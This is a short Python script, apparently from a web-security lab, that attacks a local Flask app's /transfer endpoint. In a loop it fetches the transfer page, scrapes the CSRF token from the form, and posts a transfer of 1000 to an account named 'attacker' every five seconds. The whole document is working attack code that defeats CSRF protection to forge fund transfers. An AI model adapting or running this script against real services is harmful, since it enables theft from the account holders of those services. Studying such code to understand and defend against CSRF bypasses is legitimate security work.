from flask import Flask, render_template, request, make_response, redirect
import requests
import time
from lxml import html

token=""

def start_token():
    global token
    while(True):
        page=requests.get("http://localhost:5000/transfer")
        tree = html.fromstring(page.content)
        token=dict(tree.forms[0].inputs.items())["csrf_token"].value
        print("got token {}".format(token))
        r=requests.post("http://localhost:5000/transfer", data={'transfer':'1000', 'to':'attacker', 'csrf_token':token})
        print(r.text)
        time.sleep(5)

def main():

    start_token()

if __name__=="__main__":
    main()
